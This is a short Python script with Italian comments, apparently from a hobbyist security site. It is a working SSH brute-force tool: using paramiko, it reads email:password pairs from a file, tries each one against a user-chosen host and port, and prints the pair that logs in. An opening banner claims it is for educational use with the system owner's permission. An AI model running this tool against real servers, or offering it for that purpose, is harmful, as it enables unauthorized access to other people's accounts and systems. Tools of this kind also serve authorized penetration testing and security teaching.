#danielelinux.it

import paramiko
import os 

#variabili globali
PORTA_DEFAULT = 22
FILE_ESISTE = False


def start():
    print(
    '''
        _             _      _      _ _                    _ _   
    __| | __ _ _ __ (_) ___| | ___| (_)_ __  _   ___  __ (_) |_ 
    / _` |/ _` | '_ \| |/ _ \ |/ _ \ | | '_ \| | | \ \/ / | | __|
    | (_| | (_| | | | | |  __/ |  __/ | | | | | |_| |>  < _| | |_ 
    \__,_|\__,_|_| |_|_|\___|_|\___|_|_|_| |_|\__,_/_/\_(_)_|\__|
    '''
    )

    print('''
    [!] ATTENZIONE: Questo script è fornito esclusivamente a scopo educativo e di studio. 
    È vietato utilizzarlo per compromettere la sicurezza di sistemi informatici o per attività illegali. 
    Assicurati di avere il permesso esplicito del proprietario del sistema prima di eseguire qualsiasi operazione di test di sicurezza.

    ''')


    x = input("Premi invio...")
    print("\n\n")


def ssh_bruteforce(host, port, credenziali):
    global FILE_ESISTE
    while FILE_ESISTE == False:  # Ciclo infinito che si interromperà all'interno
        if os.path.isfile(credenziali):  # Se il file esiste
            with open(credenziali, 'r') as f:
                for line in f.readlines():
                    email, password = line.strip().split(':')
                    
                    try:
                        print(f"\n[*] Tentativo con {email}:{password}")

                        ssh_client = paramiko.SSHClient()
                        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        
                        ssh_client.connect(host, port=port, username=email, password=password, timeout=10)
                        print(f"[+] PASSWORD TROVATA: {email}:{password}")
                        ssh_client.close()
                        return  # Uscire dal ciclo e dalla funzione se le credenziali sono corrette
                        
                    except paramiko.AuthenticationException:
                        print(f"[-] Credenziali Invalide: {email}:{password} \n")
                    except EOFError:
                        print(f"[!] Potrebbe essere un problema di connessione.")

            FILE_ESISTE = True #se il file è stato provato ed c'è stato il bruteforce, esci dal ciclo

        else:
            print("\nFile non trovato, assicurati di aver inserito correttamente il percorso.")
            credenziali = input("Inserisci il percorso del file credenziali (es. credenziali.txt, formato email:password): ")


def input_utente():

    host = input("Inserisci l'host (es. 192.168.1.92): ")
    port_input = input(f"Inserisci la porta (default {PORTA_DEFAULT}): ")
    
    #porta predefinita se l'utente non inserisce nulla
    port = int(port_input) if port_input else PORTA_DEFAULT
    
    credenziali_file = input("Inserisci il percorso del file credenziali (es. credenziali.txt, formato file email:password): ")

    ssh_bruteforce(host, port, credenziali_file)


start()
input_utente()
